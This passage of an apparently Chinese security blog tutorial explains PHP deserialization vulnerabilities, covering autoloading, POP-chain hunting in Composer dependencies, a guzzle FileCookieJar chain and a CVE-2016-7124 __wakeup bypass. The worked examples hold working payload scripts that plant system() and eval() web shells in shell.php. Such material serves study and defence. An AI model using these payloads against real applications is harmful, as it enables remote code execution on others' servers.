+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1_data = <span class="string">'test1_data'</span>;</span><br><span class="line">    <span class="keyword">private</span> $test1_filename = <span class="string">'./test1_demo.txt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;test1_filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($test1_filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($test1_filename, <span class="keyword">$this</span>-&gt;test1_data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其余的<code>test2</code>和<code>test3</code>和<code>test1</code>的内容类似。</p>
+<p>运行一下<code>index.php</code>：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999262214593.jpg" alt=""></p>
+<p>可以看到已经自动加载类会自动寻找已经注册在其队列中的类，并在其被实例化的时候，执行相关的操作。</p>
+<p>若想了解更多关于自动加载类的资料，请查阅<a href="http://lucifaer.com/index.php/archives/17/">spl_autoload_register</a></p>
+<h2 id="4-Composer与Autoloading"><a href="#4-Composer与Autoloading" class="headerlink" title="4. Composer与Autoloading"></a>4. Composer与Autoloading</h2><p>说到了Autoloader自动加载类，就不得不说一下Composer这个东西了。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。</p>
+<p>经常搭建框架环境的同学应该对这个非常熟悉了，无论是搭建一个新的Laravel还是一个新的Symfony，安装步骤中总有一步是通过Composer来进行安装。</p>
+<p>比如在安装Laravel的时候，执行<code>composer global require &quot;laravel/installer&quot;</code>就可以搭建成以下目录结构的环境：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999270597374.jpg" alt=""></p>
+<p>其中已经将环境所需的依赖库文件配置完毕，正是因为Composer与Autuoloading的有效结合，才构成了完整的POP数据流。</p>
+<h1 id="0x04-反序列化漏洞的挖掘"><a href="#0x04-反序列化漏洞的挖掘" class="headerlink" title="0x04 反序列化漏洞的挖掘"></a>0x04 反序列化漏洞的挖掘</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>通过上面对Composer的介绍，我们可以看出，Composer所拉取的依赖库文件是一个框架的基础。</p>
+<p>而Composer默认是从Packagist来下载依赖库的。</p>
+<p>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p>
+<p>目前总结出来两种大的趋势，还有一种猜想：</p>
+<ol>
+<li>从可能存在漏洞的依赖库文件入手</li>
+<li>从应用的代码框架的逻辑上入手</li>
+<li>从PHP语言本身漏洞入手</li>
+</ol>
+<p>接下来逐个的介绍一下。</p>
+<h2 id="2-依赖库"><a href="#2-依赖库" class="headerlink" title="2. 依赖库"></a>2. 依赖库</h2><p>以下这些依赖库，准确来说并不能说是依赖库的问题，只能说这些依赖库存在我们想要的文件读写或者代码执行的功能。而引用这些依赖库的应用在引用时并没有完善的过滤，从而产生漏洞。</p>
+<ul>
+<li>cartalyst/sentry</li>
+<li>cartalyst/sentinel</li>
+</ul>
+<p>寻找依赖库漏洞的方法，可以说是简单粗暴：</p>
+<ul>
+<li>首先在依赖库中使用<code>RIPS</code>或<code>grep</code>全局搜索<code>__wakeup()</code>和<code>__destruct()</code></li>
+<li>从最流行的库开始，跟进每个类，查看是否存在我们可以利用的组件（可被漏洞利用的操作）</li>
+<li>手动验证，并构建POP链</li>
+<li>利用易受攻击的方式部署应用程序和POP组件，通过自动加载类来生成poc及测试漏洞。</li>
+</ul>
+<p>以下为一些存在可利用组件的依赖库：</p>
+<ul>
+<li>任意写<ul>
+<li>monolog/monolog(&lt;1.11.0)</li>
+<li>guzzlehttp/guzzle</li>
+<li>guzzle/guzzle</li>
+</ul>
+</li>
+<li>任意删除<ul>
+<li>swiftmailer/swiftmailer</li>
+</ul>
+</li>
+<li>拒绝式服务(proc_terminate())<ul>
+<li>symfony/process</li>
+</ul>
+</li>
+</ul>
+<p>下面来举一个老外已经说过的经典例子，来具体的说一下过程。</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="1-寻找可能存在漏洞的应用"><a href="#1-寻找可能存在漏洞的应用" class="headerlink" title="1. 寻找可能存在漏洞的应用"></a>1. 寻找可能存在漏洞的应用</h4><p>存在漏洞的应用：cartalyst/sentry</p>
+<p>漏洞存在于：/src/Cartalyst/Sentry/Cookies/NativeCookie.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCookie</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     ...</span><br><span class="line">     <span class="keyword">return</span> unserialize($_COOKIE[<span class="keyword">$this</span>-&gt;getKey()]);</span><br><span class="line">     ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>应用使用的库中的可利用的POP组件：guzzlehttp/guzzle</p>
+<p>寻找POP组件的最好方式，就是直接看<code>composer.json</code>文件，该文件中写明了应用需要使用的库。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">    <span class="string">"require"</span>: &#123;</span><br><span class="line">    <span class="string">"cartalyst/sentry"</span>: <span class="string">"2.1.5"</span>,</span><br><span class="line">    <span class="string">"illuminate/database"</span>: <span class="string">"4.0.*"</span>,</span><br><span class="line">    <span class="string">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span>,</span><br><span class="line">    <span class="string">"swiftmailer/swiftmailer"</span>: <span class="string">"5.4.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-寻找可以利用的POP组件"><a href="#2-寻找可以利用的POP组件" class="headerlink" title="2. 寻找可以利用的POP组件"></a>2. 寻找可以利用的POP组件</h4><p>我们下载guzzlehttp/guzzle这个依赖库，并使用grep来搜索一下<code>__destruct()</code>和<code>__wakeup()</code></p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999994724838.jpg" alt=""></p>
+<p>逐个看一下，在/guzzle/src/Cookie/FileCookieJar.php发现可利用的POP组件：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999995535422.jpg" alt=""></p>
+<p>跟进看一下save方法：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999996019593.jpg" alt=""></p>
+<p>存在一下代码，造成任意文件写操作：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === file_put_contents($filename, $jsonStr))</span><br></pre></td></tr></table></figure>
+<p>注意到现在<code>$filename</code>可控，也就是文件名可控。同时看到<code>$jsonStr</code>为上层循环来得到的数组经过json编码后得到的，且数组内容为<code>$cookie-&gt;toArray()</code>，也就是说如果我们可控<code>$cookie-&gt;toArray()</code>的值，我们就能控制文件内容。</p>
+<p>如何找到<code>$cookie</code>呢？注意到前面</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000019016695.jpg" alt=""></p>
+<p>跟进父类，看到父类implements了CookieJarInterface</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000019757754.jpg" alt=""></p>
+<p>还有其中的toArray方法</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000020174432.jpg" alt=""></p>
+<p>很明显调用了其中的SetCookie的接口：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000021165941.jpg" alt=""></p>
+<p>看一下目录结构：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000021860870.jpg" alt=""></p>
+<p>所以定位到SetCookie.php：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000022331337.jpg" alt=""></p>
+<p>可以看到，这里只是简单的返回了data数组的特定键值。</p>
+<h4 id="3-手动验证，并构建POP链"><a href="#3-手动验证，并构建POP链" class="headerlink" title="3. 手动验证，并构建POP链"></a>3. 手动验证，并构建POP链</h4><p>首先我们先在vm中写一个composer.json文件：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来安装Composer：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://getcomposer.org/installer | php</span><br></pre></td></tr></table></figure>
+<p>然后根据composer.json来安装依赖库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php composer.phar install</span><br></pre></td></tr></table></figure>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000052755445.jpg" alt=""></p>
+<p>接下来，我们根据上面的分析，来构造payload：</p>
+<blockquote>
+<p>payload.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">FileCookieJar</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">SetCookie</span>;</span><br><span class="line"></span><br><span class="line">        $obj = <span class="keyword">new</span> FileCookieJar(<span class="string">'./shell.php'</span>);</span><br><span class="line"></span><br><span class="line">        $payload = <span class="string">'&lt;?php echo system($_POST[\'poc\']);?&gt;'</span>;</span><br><span class="line">        $obj-&gt;setCookie(<span class="keyword">new</span> SetCookie([</span><br><span class="line">                <span class="string">'Name'</span> =&gt; <span class="string">'lucifaer'</span>,</span><br><span class="line">                <span class="string">'Value'</span> =&gt; <span class="string">'test_poc'</span>,</span><br><span class="line">                <span class="string">'Domain'</span> =&gt; $paylaod,</span><br><span class="line">                <span class="string">'Expires'</span> =&gt; time()</span><br><span class="line">        ]));</span><br><span class="line"></span><br><span class="line">        file_put_contents(<span class="string">'./build_poc'</span>, serialize($obj));</span><br></pre></td></tr></table></figure>
+<p>我们执行完该脚本，看一下生成的脚本的内容：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000080660821.jpg" alt=""></p>
+<p>我们再写一个反序列化的demo脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">    unserialize(file_get_contents(<span class="string">"./build_poc"</span>));</span><br></pre></td></tr></table></figure>
+<p>运行后，完成任意文件写操作。至此，我们可以利用生成的序列化攻击向量来进行测试。</p>
+<h2 id="3-PHP语言本身漏洞"><a href="#3-PHP语言本身漏洞" class="headerlink" title="3. PHP语言本身漏洞"></a>3. PHP语言本身漏洞</h2><p>提到这一点就不得不说去年的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a>，同时具有代表性的漏洞即为<a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入</a>。</p>
+<p>在这里我们就不多赘述SugarCRM的这个漏洞，我们来聊一聊<code>CVE-2016-7124</code>这个漏洞。</p>
+<p>触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。</p>
+<p>漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行。</p>
+<p>我们用一个demo来解释一下。</p>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">       &#125;        </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">$poc = $_GET[<span class="string">'poc'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($poc))</span><br><span class="line">&#123;</span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($poc);</span><br></pre></td></tr></table></figure>
+<p>代码很简单，但是关键就是需要再反序列化的时候绕过<code>__wakeup</code>以达到写文件的操作。</p>
+<p>根据cve-2016-7124我们可以构造一下我们的poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">$a = <span class="keyword">new</span> Test(<span class="string">'shell'</span>);</span><br><span class="line">$poc = serialize($a);</span><br><span class="line"><span class="keyword">print</span>($poc);</span><br></pre></td></tr></table></figure>
+<p>运行该脚本，我们就获得了我们poc</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000946064992.jpg" alt=""></p>
+<p>通上文所说道的，在这里需要改两个地方：</p>
+<ul>
+<li>将1改为大于1的任何整数</li>
+<li>将<code>Testpoc</code>改为<code>%00Test%00poc</code></li>
+</ul>
+<p>传入修改后的poc，即可看到：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000947516393.jpg" alt=""></p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000947623762.jpg" alt=""></p>
+<p>写文件操作执行成功。</p>
+<h1 id="0x05-拓展思路"><a href="#0x05-拓展思路" class="headerlink" title="0x05 拓展思路"></a>0x05 拓展思路</h1><h2 id="1-抛砖引玉——魔法函数可能造成的威胁"><a href="#1-抛砖引玉——魔法函数可能造成的威胁" class="headerlink" title="1. 抛砖引玉——魔法函数可能造成的威胁"></a>1. 抛砖引玉——魔法函数可能造成的威胁</h2><p>刚刚想到这一点的时候准备好好研究一下，没想到p师傅第二天小密圈就放出来这个话题了。接下来顺着这个思路，我们向下深挖一下。</p>
+<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>经过上面的总结，我们不难看出，PHP中反序列化导致的漏洞中，除了利用PHP本身的漏洞以外，我们通常会寻找<code>__destruct</code>、<code>__wakeup</code>、<code>__toString</code>等方法，看看这些方法中是否有可利用的代码。</p>
+<p>而由于惯性思维，<code>__toString</code>常常被漏洞挖掘者忽略。其实，当反序列化后的对象被输出在模板中的时候（转换成字符串的时候），就可以触发相应的漏洞。</p>
+<p><code>__toString</code>触发条件：</p>
+<ul>
+<li><code>echo ($obj) / print($obj)</code> 打印时会触发</li>
+<li>字符串连接时</li>
+<li>格式化字符串时</li>
+<li>与字符串进行<code>==</code>比较时（PHP进行==比较的时候会转换参数类型）</li>
+<li>格式化SQL语句，绑定参数时</li>
+<li>数组中有字符串时</li>
+</ul>
+<p>我们来写一个demo看一下</p>
+<blockquote>
+<p>toString_demo.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">toString_demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">'test1'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = $test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__destruct:"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__wakeup:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"wakeup"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __toString() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__toString:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"tosTRING"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> toString_demo(<span class="string">"demo"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$c = unserialize($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print "\n".$a."\n";</span></span><br><span class="line"><span class="comment">//print $b."\n";</span></span><br><span class="line"><span class="keyword">print</span> $c;</span><br></pre></td></tr></table></figure>
+<p>执行结果为下：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001060847306.jpg" alt=""></p>
+<p>通过上面的测试，可以总结以下几点：</p>
+<ul>
+<li><code>echo ($obj) / print($obj)</code> 打印时会触发</li>
+<li><code>__wakeup</code>的优先级&gt;<code>__toString</code>&gt;<code>__destruct</code></li>
+<li>每执行完一个魔法函数，</li>
+</ul>
+<p>接下来从两个方面继续来深入：</p>
+<ul>
+<li>字符串操作</li>
+<li>魔术函数的优先级可能造成的变量覆盖</li>
+</ul>
+<h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><ul>
+<li><p>字符串拼接：</p>
+<p>  在字符串与反序列化后的对象与字符串进行字符串拼接时，会触发<code>__toString</code>方法。</p>
+<p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001078785425.jpg" alt=""></p>
+</li>
+<li><p>字符串函数：</p>
+<p>  经过测试，当反序列化后的最想在经过php字符串函数时，都会执行<code>__toString</code>方法，从这一点我们就可以看出，<code>__toString</code>所可能造成的安全隐患。</p>
+<p>  下面举几个常见的函数作为例子（所使用的类还是上面给出的toString_demo类）：</p>
+<p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001086072919.jpg" alt=""></p>
+</li>
+</ul>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001088645356.jpg" alt=""></p>
+<h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><p>将反序列化后的对象加入到数组中，并不会触发<code>__toString</code>方法：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001858902513.jpg" alt=""></p>
+<p>但是在<code>in_array()</code>方法中，在数组中有<code>__toString</code>返回的字符串的时候<code>__toString</code>会被调用：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001890784548.jpg" alt=""></p>
+<h4 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h4><p>从<code>in_array()</code>方法中，我们又有了拓展性的想法。我们都知道，在php底层，类似于<code>in_array()</code>这类函数，都属于先执行，之后返回判断结果。那么顺着这个想法，我想到了去年的<a href="http://paper.seebug.org/11/" target="_blank" rel="noopener">IPS Community Suite &lt;= 4.1.12.3 Autoloaded PHP远程代码执行漏洞</a>，这个漏洞中有一个非常有意思的触发点，就是通过<code>class_exists</code>造成相关类的调用，从而触发漏洞。</p>
+<p>通过测试，我们发现了，如果将反序列化后的对象带入<code>class_exists()</code>方法中，同样会造成<code>__toString</code>的执行：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001897871207.jpg" alt=""></p>
+<h2 id="2-猜想——对象处理过程可能出现的威胁"><a href="#2-猜想——对象处理过程可能出现的威胁" class="headerlink" title="2. 猜想——对象处理过程可能出现的威胁"></a>2. 猜想——对象处理过程可能出现的威胁</h2><p>通过<code>class_exists</code>可能触发的危险操作，继续向下想一下，是否在对象处理过程中也有可能存在漏洞呢？</p>
